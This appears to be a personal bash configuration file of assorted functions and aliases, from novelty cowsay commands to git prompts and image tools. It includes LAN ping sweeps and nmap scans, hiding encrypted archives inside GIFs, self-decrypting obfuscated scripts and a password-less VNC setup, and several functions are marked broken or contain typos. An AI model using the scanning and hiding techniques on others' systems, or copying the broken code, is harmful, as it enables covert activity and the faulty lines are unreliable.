function fortunecow() { fortune | cowsay -f $(ls /usr/share/cowsay/cows/| sed 's/ /\n/g' | sed -e '/^$/d'| shuf -n1) ; }
##==========================================
## Random rainbow cow says fortune slowly
function fortunecowcat() { fortune | cowsay -f $(ls /usr/share/cowsay/cows/| sed 's/ /\n/g' | sed -e '/^$/d'| shuf -n1) | lolcat -a ; }
##==========================================
## Randow rainbow cow says Corporate BS slowly
function corpcow() { curl -s http://cbsg.sourceforge.net/cgi-bin/live | grep -Eo '^<li>.*</li>' | sed s,\</\\?li\>,,g | shuf -n 1 | cowsay -f $(ls /usr/share/cowsay/cows/| sed 's/ /\n/g' | sed -e '/^$/d'| shuf -n1) | lolcat -a ; }
##==========================================
## ix, command line patebin
## Examples:
##     ix hello.txt              # paste file (name/ext will be set).
##     echo Hello world. | ix    # read from STDIN (won't set name/ext).t
##     ix -n 1 self_destruct.txt # paste will be deleted after one read.
##     ix -i ID hello.txt        # replace ID, if you have permission.
##     ix -d ID
function ix() { local opts; local OPTIND; [ -f "$HOME/.netrc" ] && opts='-n'; while getopts ":hd:i:n:" x; do case $x in h) echo "ix [-d ID] [-i ID] [-n N] [opts]"; return;; d) $echo curl $opts -X DELETE ix.io/$OPTARG; return;; i) opts="$opts -X PUT"; local id="$OPTARG";; n) opts="$opts -F read:1=$OPTARG";; esac; done; shift $(($OPTIND - 1)); [ -t 0 ] && { local filename="$1"; shift; [ "$filename" ] && { curl $opts -F f:1=@"$filename" $* ix.io/$id; return; } ; echo "^C to cancel, ^D to send."; } ; curl $opts -F f:1='<-' $* ix.io/$id; }
##==========================================
## Not working. Unexpected token '(' Do Not Know Why
## Get fully qualified domain names (FQDNs) for IP address with failure and multiple detection.
#function fqdns() { NAME=$(nslookup $1 | sed -n 's/.*arpa.*name = \(.*\)/\1/p'); test -z "$NAME" &&NAME="NO_NAME"; echo "$NAME" ; }
##==========================================
## Cleanly list available wireless networks (using iwlist)
function wifiscan() { iwlist $(ifconfig | grep wlan | awk '{print $1 }') scan | sed -ne 's#^[[:space:]]*\(Quality=\|Encryption key:\|ESSID:\)#\1#p' -e 's#^[[:space:]]*\(Mode:.*\)$#\1\n#p' ; }
##==========================================
## Cleanly list available wireless networks (using iwlist)
function wifiscan2() { iwlist $(ifconfig | grep wlp3s0 | awk '{print $1 }') scan | sed -ne 's#^[[:space:]]*\(Quality=\|Encryption key:\|ESSID:\)#\1#p' -e 's#^[[:space:]]*\(Mode:.*\)$#\1\n#p' ; }
##==========================================
## Single use vnc-over-ssh connection Usage: sshvnc user@your.ip.add.ress
function sshvnc() { ssh -f -L 5900:localhost:5900 $1 "x11vnc -safer -localhost -nopw -once -display :0" ; vinagre localhost:5900 ; }
##==========================================
## Convert diff output to HTML ins/del. Usage: diffhtml file1.txt file2.txt
function diff2html() { diff $1 $2 | grep -E '^(<|>)' | sed 's:^< \(.*\):<del style="color\:red; text-decoration\: none">- \1</del><br>:' | sed 's:^> \(.*\):<ins ## style="color\:green; text-decoration\: none">+ \1</ins><br>:' ; }
##==========================================
## Get a qrcode for a given string
function qrcode() { echo $1 | curl -F-=\<- qrenco.de ; }
##==========================================
## Convert temperatures
function F2C() { echo "($1-32)/1.8" | bc ; }
function C2F() { echo "($1*1.8)+32" | bc ; }
##==========================================
## Search through .doc files
function docgrep() { find -name '*.doc' | while read -r file; do catdoc "$file" | grep -l --label="$file" "$1"; done ; }
##==========================================
## Append to all files in a folder: Usage: tag "your appended text"
function tag() { for file in *.txt; do  echo ${1} >> "$file"; done }
##==========================================
## #################
## ##    Image
## #################
##------------------------------------------
##==========================================
## Resize images. Usage: resizeimg imagename.jpg 800
function resizeimg() { convert "$1" -resize $2 "$1"-sm.jpg ; }
##==========================================
## Batch resize images in folder: Usage; batchsizejpg 600
function batchsizejpg() {  for file in *.jpg; do convert $file -resize $1 sm-$file; done }
##==========================================
## Use imagemagik to batch overlay an image centered over a background image
function overlay() { for file in *.jpg; do composite -gravity center "$1" "$file" "yt-$file"; done }
##==========================================
## ##########################
## ##    Encryption
## ##########################
##------------------------------------------
##==========================================
## Function to make encrypted file hidden in a .gif. Usage: crypt folder_to_be_encrypted  image_to_use.gif
function des3gif() { cp "$2" pic.gif && tar -zcvf stuff.tgz "$1" && openssl des3 -salt -in stuff.tgz -out encryptedstuff && zip encryptedstuff.zip encryptedstuff && cat encryptedstuff.zip >> pic.gif && cp pic.gif crypt.gif && rm  pic.gif && rm stuff.tgz && rm encryptedstuff && rm encryptedstuff.zip ; }
##------------------------------------------
## Function to de-encrypt an encrypted file hidden in a .gif image. Usage: decryptgif image_to_be_decrypted.gif
function dedes3gif() { cp $1 encryptedstuff.zip && unzip encryptedstuff.zip & openssl enc -d -des3 -salt -out stuff.tgz -in encryptedstuff && tar -zxvf stuff.tgz && rm encryptedstuff.zip && rm encryptedstuff && rm stuff.tgz ; }
##==========================================
## Function to make encrypted file hidden in a .gif. Usage: crypt folder_to_be_encrypted  image_to_use.gif
function aes256gif() { cp "$2" pic.gif && tar -zcvf stuff.tgz "$1" && enc -aes-256-cbc -salt -a -in stuff.tgz -out encryptedstuff && zip encryptedstuff.zip encryptedstuff && cat encryptedstuff.zip >> pic.gif && cp pic.gif crypt.gif && rm  pic.gif && rm stuff.tgz && rm encryptedstuff && rm encryptedstuff.zip ; }
##------------------------------------------
## Function to de-encrypt an encrypted file hidden in a .gif image. Usage: decryptgif image_to_be_decrypted.gif
function deaes256gif() { cp $1 encryptedstuff.zip && unzip encryptedstuff.zip & openssl enc -aes-256-cbc -d -a -out stuff.tgz -in encryptedstuff && tar -zxvf stuff.tgz && rm encryptedstuff.zip && rm encryptedstuff && rm stuff.tgz ; }
##==========================================
## gpg encrypt decrypt Usage: "engpg filename" or "degpg filename"
function engpg() { gpg -ac --no-options "$1"; }
function degpg() { gpg --no-options "$1"; }
##==========================================
## uses openssl aes 256 cbc encryption to encrypt file salting it with password designated by user
function aes256crypt() { echo "Encrypting $1..."; openssl enc -aes-256-cbc -salt -a -in $1 -out encrypted-$1 || { echo "File not found"; return 1; }; echo "Successfully encrypted"; }
## uses openssl aes 256 cbc encryption decrypt file
function aes256decrypt() { echo "Decrypting $1..."; openssl enc -aes-256-cbc -d -a -in $1 -out $2 || { echo "File not found"; return 1; }; echo "Successfully decrypted"; }
##==========================================
## Print a grid of colors
function colorgrid() \
{
    iter=16
    while [ $iter -lt 52 ]
    do
        second=$[$iter+36]
        third=$[$second+36]
        four=$[$third+36]
        five=$[$four+36]
        six=$[$five+36]
        seven=$[$six+36]
        if [ $seven -gt 250 ];then seven=$[$seven-251]; fi

        echo -en "\033[38;5;$(echo $iter)m█ "
        printf "%03d" $iter
        echo -en "   \033[38;5;$(echo $second)m█ "
        printf "%03d" $second
        echo -en "   \033[38;5;$(echo $third)m█ "
        printf "%03d" $third
        echo -en "   \033[38;5;$(echo $four)m█ "
        printf "%03d" $four
        echo -en "   \033[38;5;$(echo $five)m█ "
        printf "%03d" $five
        echo -en "   \033[38;5;$(echo $six)m█ "
        printf "%03d" $six
        echo -en "   \033[38;5;$(echo $seven)m█ "
        printf "%03d" $seven

        iter=$[$iter+1]
        printf '\r\n'
    done
}
##==========================================
## Put git branch in prompt
parse_git_branch() {
     git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1)/'
}
export PS1="\u@\h \[\e[32m\]\w \[\e[91m\]\$(parse_git_branch)\[\e[00m\]$ "
## #################################
## ##    Other Functions
## #################################
##------------------------------------------
## ###########################################
## ##    Aliases
## ###########################################
##------------------------------------------
## Use echo "alias name='app -a'" >> .bashrc to add new alias lines to .bashrc
##==========================================
## ###################
## ##    System
## ###################
##------------------------------------------
alias root='sudo su'
## Make changes in .bashrc immediately available
alias bashrc-reload='builtin exec bash'
## Install a app
alias install='sudo apt-get install'
## Change owner of files in your home folder to you.
alias chownhome='sudo chown -R $USER:$USER ~/'
## Only show button events for xev
alias xevs="xev | grep 'keycode\|button'"
#alias runlevel='sudo /sbin/init'
alias upowersuspend='dbus-send --system --print-reply --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend'
alias sleepnow='upowersuspend'
#alias start='dbus-launch startx'
alias startx='sudo service mdm start'
alias stopx='sudo service mdm stop'
alias clr='echo -ne "\033c"'
## Displays file types in color. Prints warning messages first. Needs fixing, but works after warnings.
alias filecolors='eval $(echo "rs:global default;fi:normal file;di:directory;ln:symbolic link;pi:named pipe;so:socket;do:door;bd:block device;cd:character device;or:orphan symlink;mi:missing file;su:set uid;sg:set gid;tw:sticky other writable;ow:other writable;st:sticky;ex:executable;"|sed -e 's/:/="/g; s/\;/"\n/g') && { IFS=:; for i in $LS_COLORS; do echo -e "\e[${i#*=}m$( x=${i%=*}; [ "${!x}" ] && echo "${!x}" || echo "$x" )\e[m"; done; }'
## list bash alias defined in .bash_profile or .bashrc
alias showallaliases='compgen -A alias'
## list bash functions defined in .bash_profile or .bashrc
alias showallfunctions='compgen -A function'
## Remove and replace /etc/hosts to block and unblock ad websites
## Block with host big file
alias hoston='sudo cat /etc/hosts.big.sort.uniq > /etc/hosts'
## Unblock with small hosts file
alias hostoff='sudo cat /etc/hosts.default > /etc/hosts'
## show installed but unused linux headers, image, or modules
alias unusedkernels="dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d'"
## vim like exit
alias :q='exit'
## !!!syntax error near unexpected token (
## du with colored bar graph with reversed order to put the focus in the big ones.
#alias filesize='du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t*c+.5); b="\033[1;31m"; for (i=0; i<r; i++) b=b"#"; printf " %5.2f%% %s\033[0m %s\n", $1/t*100, b, $2}'|tac'
## List available wifi
alias lswifi='nmcli device wifi list'
##==========================================
## ###############################
## ##    Command Parameters
## ###############################
##------------------------------------------
#alias ..='cd ..'
alias cdd='cdls'
#alias mv='mv -iv'
alias rm_='rm -iv'
alias ping='ping -c 5'
## disable annoying line wrapping in nano
alias nano='nano -W -m'
## If text fits on single screen it will just display the text and quit so you do not have to press q to quit.
alias less='less -F'
#alias back='cd $OLDPWD' # use "cd -"
alias df='df -hT'
#alias gvim='gvim -geom 84x26'
## Ignore alias by putting backslash before command '\ls'
alias ls='ls -CFh --color=always --group-directories-first '
#alias ls='ls -h --color=always'
alias ll='ls -l'
#alias la='ls -A'
#alias lssize='stat -c'\%s \%n' **\/* | sort -n'
alias lst='ls -lt --time=atime'
## Use function instead. Converts the symbolic permissions to octal (ie: numbers) when using 'ls -l': Use function instead.
#alias lso="ls -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'"
##==========================================
### grep - print lines matching a pattern. -I ignore bianaries -v not -
alias grep='grep -I --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'
##==========================================
### mc - Midnight Commander
alias mcc='mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default'
alias mce='mcedit --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default'
alias mcg='mc -S gotar'
alias mceg='mcedit -S gotar'
## Fix problem runnung mc in tmux
alias mctmux='TERM=xterm mc'
## Can run function 'mcdefault gotar' above if you want settings global- mcdefault gotar
#alias mc='mc -S gotar'
#alias mcedit='mcedit -S gotar'
##==========================================
### DOS centric aliases
alias dir="ls -l"
alias ipconfig="ifconfig"
alias del="rm -iv"
alias copy="cp -piv"
alias ver="uname -a"
alias mem="free -h"
alias move="mv -iv"
alias rename="mv -iv"
alias type="cat"
alias C:="echo 'No C drive in Linux. Go to your home directory with the command: cd'"
##==========================================
# Git aliases
alias giti="git init"
alias gits="git status -sbu"
alias gitco="git checkout"
alias gitcob="git checkout -b"
alias gitp="git push"
alias gitm="git checkout master"
alias gita="git add ."
alias gitcm="git commit -m"
alias gitpl="git pull"
alias gitst="git stash"
alias gitstl="git stash list"
alias gitlg='git log --graph --oneline --decorate --all'
##==========================================
alias mplay='mplayer -vo caca'
alias mplayerfb='sudo mplayer -vo fbdev2 -fs -zoom -x 1024 -y 600'
alias asciiplay='mplayer -vo caca'
alias gyt='googleyoutube'
alias battery='upower -i $(upower -e | grep 'BAT') | grep -E "state|to\ full|percentage"'
alias cornerclock='while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &'
alias share='pyshare'
alias lanip='for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done'
## Records voice until you stop talking.
alias vrecord='sox -t alsa default ./recording_$(date +%F.%T).flac silence 1 0.1 5% 1 1.0 5%'
## Screenshot of chosen area after 5 seconds.
alias shotarea='sleep 5 && import -frame -strip -quality 75 "$HOME/$(date +%F.%T).png"'
## Search for apps faster
alias apts='apt-cache search'
## List computers on network
alias netlist='nmap -sn 192.168.1.0/24'
##==========================================
## added by Anaconda3 5.3.1 installer
## >>> conda init >>>
## !! Contents within this block are managed by 'conda init' !!
#__conda_setup="$(CONDA_REPORT_ERRORS=false '/home/eakinc/anaconda3/bin/conda' shell.bash hook 2> /dev/null)"
#if [ $? -eq 0 ]; then \eval "$__conda_setup"; else if [ -f "/home/eakinc/anaconda3/etc/profile.d/conda.sh" ]; then . "/home/eakinc/anaconda3/etc/profile.d/conda.sh"; CONDA_CHANGEPS1=false conda activate base; else \export PATH="/home/eakinc/anaconda3/bin:$PATH";     fi; fi
#unset __conda_setup
## <<< conda init <<<
## ###########################################################
## #                    END .bashrc                          #
## ###########################################################
## #########################
## #     added by echo     #
## #########################
COMMENT1
## #####################################
## ##    Prompt
## #####################################
## Timestamped best prompt, git branch with tracking
## Untracked changes: ▲ , Unstaged Changed Files: ◼ , Staged Files: ●
## https://upload.wikimedia.org/wikipedia/commons/1/15/Xterm_256color_chart.svg
## grey:008 red:009 green:010 yellow:011 blue:012 magenta:013 cyan:014 white:015
$> function thedate() { date --utc +"%Y%m%d_%H:%M:%S" ; }
$> function parse_git_branch() { git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/'; }
$> function parse_git_untracked() { git status 2> /dev/null | grep Untracked | head -n1 | sed 's/Untracked files\:/\▲/'; }
$> function parse_git_unstaged() { git status 2> /dev/null | grep 'Changes not staged for commit' | head -n1 | sed 's/Changes not staged for commit\:/\◼/'; }
$> function parse_git_tracked() { git status 2> /dev/null | grep 'Changes to be committed' | head -n1 | sed 's/Changes to be committed\:/\●/'; }
## ZSH
#PS1='%B%F{011}%\S^%b%F{154}$(thedate)%F{039}%~%f%B$(parse_git_branch)%F{011}$(parse_git_untracked)%F{012}$(parse_git_unstaged)%F{010}$(parse_git_tracked)%{$reset_color%}%b%f⚡'
## BASH
$> PS1='\e[1;37m\h:\e[1;32m$(thedate)\e[1;34m\w\e[1;37m$(parse_git_branch)\e[1;33m$(parse_git_untracked)\e[1;34m$(parse_git_unstaged)\e[1;32m$(parse_git_tracked)\e[m⚡'
##-----------------------------------------
## #########################
## ##    Prompt
## #########################
##------------------------------------------
## Initialize colors.
$> autoload -U colors
$> colors
## Allow for functions in the prompt.
$> setopt PROMPT_SUBST
$> autoload -U add-zsh-hook
$> autoload -Uz compinit && compinit
## set a fancy prompt (non-color, unless we know we "want" color)
$> case "$TERM" in xterm|xterm-color|*-256color) color_prompt=yes;; esac
##------------------------------------------
## set variable identifying the chroot you work in (used in the prompt below)
$> if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot); fi
## set a fancy prompt (non-color, unless we know we "want" color)
$> case "$TERM" in xterm|xterm-color|*-256color) color_prompt=yes;; esac
## uncomment for a colored prompt, if the terminal has the capability.
$> force_color_prompt=yes
$> if [ -n "$force_color_prompt" ]; then if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then color_prompt=yes; else color_prompt=;     fi; fi
$> if [ "$color_prompt" = yes ]; then if [[ ${EUID} == 0 ]] ; then PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\h\[\033[01;34m\] \W \$\[\033[00m\] '; else PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \$\[\033[00m\] '; fi; else PS1='${debian_chroot:+($debian_chroot)}\u@\h \w \$ '; fi
$> unset color_prompt force_color_prompt
## If this is an xterm set the title to user@host:dir
#case "$TERM" in xterm*|rxvt*) PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h \w\a\]$PS1"; ;; *) ;; esac
##-----------------------------------------
## Mint Prompt
#PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \$\[\033[00m\] '
##-----------------------------------------
## Mint Prompt😆
#PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \😆\[\033[00m\] '
##-----------------------------------------
### Prompt
## set a fancy prompt (non-color, overwrite the one in /etc/profile)
#PS1='${debian_chroot:+($debian_chroot)}\u@\h \w \$> '
##------------------------------------------
## Set a colorful red bash prompt
#PS1='\[\e[1;31m\][\u@\h \W]\$>\[\e[0m\] '
##------------------------------------------
## Set a colorful green bash prompt
#PS1='\[\e[1;32m\][\u@\h \W]\$>\[\e[0m\] '
##------------------------------------------
## Set a colorful green bash prompt
#PS1='\[\e[1;32m\]\u@\h \W\$>\e[0m '
##------------------------------------------
## nuts with colors (figure 3):
#PS1='\[\e[1;36m\]\d \[\e[1;32m\]\t \[\e[1;33m\]\u@\[\e[1;35m\]\h:\w\$\[\e[0;31m\] '
##------------------------------------------
## ##########################
## ##    More functions
## ##########################
##==========================================
## Add an "alert" alias for long running commands.  Usage: sleep 10; alert
$> alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
##==========================================
## added by Anaconda3 5.3.1 installer
## >>> conda init >>>
## !! Contents within this block are managed by 'conda init' !!
$> __conda_setup="$(CONDA_REPORT_ERRORS=false '/home/$USER/anaconda3/bin/conda' shell.bash hook 2> /dev/null)"
$> if [ $? -eq 0 ]; then \eval "$__conda_setup"; else if [ -f "/home/$USER/anaconda3/etc/profile.d/conda.sh" ]; then . "/home/$USER/anaconda3/etc/profile.d/conda.sh"; CONDA_CHANGEPS1=false conda activate base; else \export PATH="/home/$USER/anaconda3/bin:$PATH";     fi; fi
$> unset __conda_setup
## <<< conda init <<<
##==========================================
# Get fully qualified domain names (FQDNs) for IP address with failure and multiple detection
$> NAME=$(nslookup $IP | sed -n 's/.*arpa.*name = \(.*\)/\1/p'); test -z "$NAME" &&NAME="NO_NAME"; echo "$NAME"
##------------------------------------------
# Get fully qualified domain names (FQDNs) for IP address with failure and multiple detection
$> fuction fqdns() { NAME=$(nslookup $1 | sed -n 's/.*arpa.*name = \(.*\)/\1/p'); test -z "$NAME" &&NAME="NO_NAME"; echo "$NAME" ; }
##==========================================
## geolocate a given IP address
$> function ip2loc() { wget -qO - www.ip2location.com/$1 | grep "<span id=\"dgLookup__ctl2_lblICountry\">" | sed 's/<[^>]*>//g; s/^[\t]*//; s/&quot;/"/g; s/</</g; s/>/>/g; s/&amp;/\&/g'; }
##==========================================
## cleanly list available wireless networks (using iwlist). Usage: wifiscan wlan0
$> function wifiscan() { iwlist $1 scan | sed -ne 's#^[[:space:]]*\(Quality=\|Encryption key:\|ESSID:\)#\1#p' -e 's#^[[:space:]]*\(Mode:.*\)$#\1\n#p' ; }
##==========================================
## Show all strings (ASCII & Unicode) in a file
$> function allStrings() { cat "$1" | tr -d "\0" | strings ; }
##==========================================
## Find all videos under current directory using MIME a.k.a not using extension
$> function findvid() { find ./ -type f -print0 | xargs -0 file -iNf - | grep ": video/" | cut -d: -f1 ; }
##==========================================
## Temporarily add to PATH
$> function apath() { if [ $# -lt 1 ] || [ $# -gt 2 ]; then echo "Temporarily add to PATH"; echo "usage: apath [dir]"; else PATH=$1:$PATH; fi; }
##==========================================
## grep by paragraph instead of by line
$> function grepp() { [ $# -eq 1 ] && perl -00ne "print if /$1/i" || perl -00ne "print if /$1/i" < "$2";}
##==========================================
## Convert temperatures
$> function F2C() { echo "($1-32)/1.8" | bc ; }
$> function C2F() { echo "($1*1.8)+32" | bc ; }
##==========================================
## ruler that stretches across the terminal
$> function ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do echo -n $s; done ); str=$(echo $str | cut -c -$COLUMNS) ; echo $str; done; }
##==========================================
## Backup a file with a date-time stamp
## Usage "bu filename.txt"
$> function bu() { cp $1 ${1}-`date +%Y%m%d%H%M`.backup ; }
##==========================================
## Delete function
$> function delete() { mv "$@" "/${HOME}/.local/share/Trash/files/" ; }
##==========================================
## turns the display off and will stay off until this command is run again or cancelled, even after key/cursor is touched
$> function display-offed() { LF=/tmp/screen-lock; if [ -f $LF ]; then /bin/rm $LF; else touch $LF; sleep .5; while [ -f  $LF ]; do xset dpms force off; sleep 2; done; fi ; }
##==========================================
## view someone's twitter stream from terminal
$> function grabtweets() { curl -s "twitter.com/$1" | sed -ne '/entry-content/{s/<[^>]*>//g;s/^[ \t]*//;p}'; }
##==========================================
## Resizing an image
## USAGE: image_resize "percentage of image resize" "input image" "output image"
$> function image_resize() { convert -sample "$1"%x"$1"% "$2" "$3" ; }
##==========================================
## Using PIPEs, Execute a command, convert output to .png file, upload file to imgur.com, then returning the address of the .png.
$> function imgur() { convert label:@- png:-|curl -F "image=@-" -F "key=1913b4ac473c692372d108209958fd15" http://api.imgur.com/2/upload.xml|grep -E -o "<original>(.)*</original>" | grep -E -o "http://i.imgur.com/[^<]*" ; }
##==========================================
## Convert the first letter into lowercase letters
$> function lcfirst() { if [ -n "$1" ]; then perl -e 'print lcfirst('$1')'; else cat - | perl -ne 'print lcfirst($_)'; fi; }
##==========================================
## Lookup on IMDB Internet Movie Database
$> function imdb() { w3m -dump "http://www.imdb.com/find?s=all&q="${@}"&x=0&y=0" & }
##==========================================
## NOT WORKING better one above
## ThePirateBay.org torrent search
$> function piratebay() { lynx -dump https://proxyspotting.in/s/?q=$1&page=0&orderby=99|awk '/TPB.torrent$/ {print $2}' ; }
##==========================================
## Screenshot of chosen area
$> function shot() { sleep 5 ; import -frame -strip -quality 75 "$HOME/$(date +%s).png" ; }
$> alias shotarea='sleep 5 ; import -frame -strip -quality 75 "$HOME/$(date +%s).png"'
##==========================================
## Create an easy to pronounce temporary shortened URL from shoutkey.com
$> function shoutkey() { curl -s "http://shoutkey.com/new?url=$1" | sed -n 's/\<h1\>/\&/p' | sed 's/<[^>]*>//g;/</N;//b' ; }
##==========================================
$> function showdiff() { wdiff -n -w $'\033[30;41m' -x $'\033[0m' -y $'\033[30;42m' -z $'\033[0m' $1 $2 ; }
##==========================================
## Search and play youtube videos directly to terminal (no X needed) ytmp 'Stairway to heaven - Led Zeppelin' mplayer is pauseable and can skip ahead
$> function ytmp() { youtube-dl -q --max-downloads 1 --no-playlist --default-search ${2:-ytsearch} "$1" -o - | mplayer -vo null /dev/fd/3 3<&0 </dev/tty; }
##==========================================
## Randomly run command
$> function ran() { [ $((RANDOM%100)) -lt "$1" ] && shift && "$@"; }
## Randomly decide whether to run a command, or fail.
## Useful for testing purposes.
## Usage: ran PERCENTAGE COMMAND [ARGS]
## Note: In this version the percentage is required.
## This is like @sesom42 and @snipertylers commands but in a USABLE form.
## e.g. In your complicated shell script, put "ran 99" before a crucial component.
## Now, it will fail 1% of the time allowing you to test the failure code-path.
##==========================================
## Play online music in terminal
$> function pvl() { (for i in "$@"; do youtube-dl -q --max-downloads 1 --no-playlist "$i" -o - | mplayer -vo null /dev/fd/3 3<&0 </dev/tty; sleep .5; done); }015-
## pvl 'link1' 'link2' 'link3'
## Play Youtube, Vimeo, etc links without visual elements.
## Great for music videos when you just want the audio.
## You can control mplayer with this!
## Hit Ctrl-C twice to exit (if youre playing multiple files)
##==========================================
## Make changes in .bashrc immediately available
$> function bashrc-reload() { builtin exec bash ; }
##==========================================
## Find the package that installed a command
$> function whatinstalled() { which "$@" | xargs -r readlink -f | xargs -r dpkg -S ;}
##==========================================
$> function phase() { while :; do for n in E4 F#4 B4 C#5 D5 F#4 E4 C#5 B4 F#4 D5 C#5; do /usr/bin/play -qn synth $1 pluck $n; done; echo -n "[$1]"; done; }; phase 0.13 & phase 0.131 &
## The Piano Phase piece, by Steve Reich is a minimalist composition which is played on two pianos played at slightly different tempos, a task thats very difficult to accomplish by human players. The auditive effects produced by the cell displacement produce beautiful patterns. See https://en.wikipedia.org/wiki/Piano_Phase . My rendered version: https://ydor.org/SteveReich/piano_phase.mp3
## Requires sox to be installed on the system.
## There are multiple videos on youtube showing different approaches and experiences to this interpretation. There is also a synthesized version.
## Even if Bash can behave as a powerful pianist, a simple threaded version leaves full room to several time glitches and even negative displacements, the same issues that human pianists experience when playing the piece. The older the computer, the better the chaos added to the result due to the CPU load. Apparently thats the reason Steve Reich composes pieces such as this.
## Without further ado, please give a warm welcome to the Bash minimalist player on synthesized two-threaded pianos. Please turn off your cellphones.
##==========================================
$> function Zscrypt(){ [ -n "$1" ]&&{ echo '. <(echo "$(tail -n+2 $0|base64 -d|mcrypt -dq)"); exit;'>$1.scrypt;cat $1|mcrypt|base64 >>$1.scrypt;chmod +x $1.scrypt;};}
## Bash scripts encryption and passphrase-protection
## This function will encrypt a bash script and will only execute it after providing the passphrase. Requires mcrypt to be installed on the system.
## cat hello
## #!/bin/bash
## case "$1" in
## ""|-h) echo "This is the fantastic Hello World. Try this:" $(basename $0) "[entity]" ;;
## moon) echo Good night. ;;
## sun) echo Good morning. ;;
## world) echo "Hello, world!" ;;
## *) echo Hi, $@. ;;
## esac
## scrypt hello
## Enter the passphrase (maximum of 512 characters)
## Please use a combination of upper and lower case letters and numbers.
## Enter passphrase:
## Enter passphrase:
## Stdin was encrypted.
## cat hello.scrypt
## . <(echo "$(/usr/bin/tail -n+2 $0|base64 -d|mcrypt -dq)");exit;
## AG0DQHJpam5kYWVsLTEyOAAgAGNiYwBtY3J5cHQtc2hhMQAV34412aaE8sRzQPQzi09YaNQPedBz
## aGExAARvB6A/HYValW4txoCFmrlp57lmvhKBbM4p+OUiZcCxr6Y+Mm7ogg3Y14pHi0CrfT70Tubq
## 9g8/kNJrQr7W/ogHpVuOOdD0YfuRatrV7W2+OlNQ63KX780g4qTHrTqNnyLp8sF5RQ7GwxyZ0Oti
## kROtVIU4g4+QAtn/k/e7h7yt4404VF1zzCYRSw20wmJz1o/Z0XO7E/DFBr5Bau7bWjnF7CRVtims
## HGrDwv1miTtAcyB9PknymDxhSyjDUdNhqXGBIioUgqjX1CKgedtO0hQp050MiQd3I6HacpSrVUIW
## kuuS+BtMrxHDy+48Mh1hidV5JQFP7LP5k+yAVLpeHd2m2eIT1rjVE/Bp2cQVkpODzXcWQDUAswUd
## vulvj/kWDQ==
## ./hello
## This is the fantastic Hello World. Try this: hello [entity]
## ./hello.scrypt
## Enter passphrase:
## This is the fantastic Hello World. Try this: hello.scrypt [entity]
## ./hello world
## Hello, world!
## ./hello.scrypt world
## Enter passphrase:
## Hello, world!
##==========================================
## Recording SSH sessions in a log file. The -a option appends the output to the end of file instead of writing over it.
$> ssh -l USER HOST | tee -a /path/to/file
$> function sshlog () { \ssh $@ 2>&1 | tee -a $(date +%Y%m%d).log; }
## You can also create an alias in ~/.bashrc to record your session when using ssh:
$> alias ssh=sshlog
##==========================================
## Search through .doc files
$> function docsearch() { find -name '*.doc' | while read -r file; do catdoc "$file" | grep -l --label="$file" "$1"; done ; }
##==========================================
## Convert diff output to HTML ins/del. Usage: diffhtml file1.txt file2.txt
$> function diffhtml() { diff $1 $2 | grep -E '^(<|>)' | sed 's:^< \(.*\):<del style="color\:red; text-decoration\: none">- \1</del><br>:' | sed 's:^> \(.*\):<ins ## style="color\:green; text-decoration\: none">+ \1</ins><br>:'
##==========================================
## Display headlines from current news.  First get a apiKey from newsapi.org.
$> function getnews () { curl https://newsapi.org/v2/top-headlines -s -G -d sources=$1 -d apiKey=noapikeyforyou | jq '.articles[] | .title'; }
## or
$> function getnews () { curl https://newsapi.org/v2/top-headlines -s -G -d sources=$1 -d apiKey=YourAPIKeyNumber | jq -r '.articles[] | .title, .url, ""' ; }
##------------------------------------------
$> function startmyday () {
$>  echo "Good morning."
$>  echo "\nUpdating Homebrew..."
$>  brew update && brew upgrade
